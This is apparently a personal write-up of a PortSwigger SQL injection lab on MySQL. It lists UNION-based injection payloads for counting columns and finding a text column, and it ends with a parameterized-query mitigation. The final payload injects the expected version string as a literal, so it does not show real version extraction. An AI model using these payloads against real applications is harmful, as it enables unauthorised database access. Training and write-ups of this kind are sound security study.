# Lab: SQL Injection - Querying DB type and version (MySQL)

**Platform:** PortSwigger Web Security Academy

**Vulnerability:** SQLi - UNION Based

### Objective
Make the application display string: `8.0.42-0ubuntu0.20.04.1`

### Steps
1. **Find columns:**
   `' ORDER BY 1-- -` -> OK
   `' ORDER BY 2-- -` -> OK
   `' ORDER BY 3-- -` -> Error (So 2 columns)

2. **Find string column:**
   `' UNION SELECT 'a','b'-- -`

3. **Final Payload:**
   `' UNION SELECT '8.0.42-0ubuntu0.20.04.1',NULL-- -`

### Learning
- ORDER BY for column count
- UNION SELECT for data extraction
- Commenting with `-- -`
- 
### Proof of Concept
![Lab Solved](SQLI1.png)

### Mitigation
Use parameterized queries / Prepared Statements.
